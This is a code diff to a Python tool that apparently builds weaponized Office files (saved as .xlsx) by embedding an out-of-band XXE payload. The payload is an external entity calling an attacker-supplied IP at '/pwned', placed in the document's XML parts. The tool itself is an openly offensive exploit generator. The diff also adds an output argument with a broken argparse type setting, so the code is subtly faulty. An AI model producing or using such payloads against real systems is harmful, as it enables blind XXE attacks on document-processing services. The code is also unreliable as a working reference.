@@ -34,7 +34,7 @@ def is_xml(file):
 
 
 def embed_payload(file, ip):
-    payload = "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"http://{}\"> ]><x>&xxe;</x>".format(ip)
+    payload = "<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY sp SYSTEM \"http://{}/pwned\">]><r>&sp;</r>".format(ip)
     with open(file, 'r') as f:
         content = f.readlines()
         content = [x.strip() for x in content]
@@ -49,9 +49,11 @@ def embed_payload(file, ip):
 
 
 def compress(path, ziph):
-    for root, dirs, files in os.walk(path):
+    os.chdir(path)
+    for root, dirs, files in os.walk('.'):
         for file in files:
             ziph.write(os.path.join(root, file))
+    os.chdir('..')
 
 
 def main():
@@ -59,13 +61,15 @@ def main():
     
     parser.add_argument('-f', '--file', type=str, metavar='', required=True, help='base file')
     parser.add_argument('-i', '--ip-address', type=str, metavar='', required=True, help='ip address to be placed in payloads (OOB XXE)')
-    
+    parser.add_argument('-o', '--out', type='str', metavar='', required=True, help='directory to save output')
+
     args = parser.parse_args()
 
     prepare(args.file)
     positions = set_payload_positions()
 
-    os.mkdir('payloads')
+    out_dir = args.out
+    os.mkdir(out_dir)
 
     for file in positions:
         if os.path.isfile(file):
@@ -84,7 +88,7 @@ def main():
                 add_ext = output + '.xlsx'
                 os.rename(output, add_ext)
 
-                shutil.move(add_ext, 'payloads')
+                shutil.move(add_ext, out_dir)
                 shutil.rmtree(tmp_dir)
 
             else:
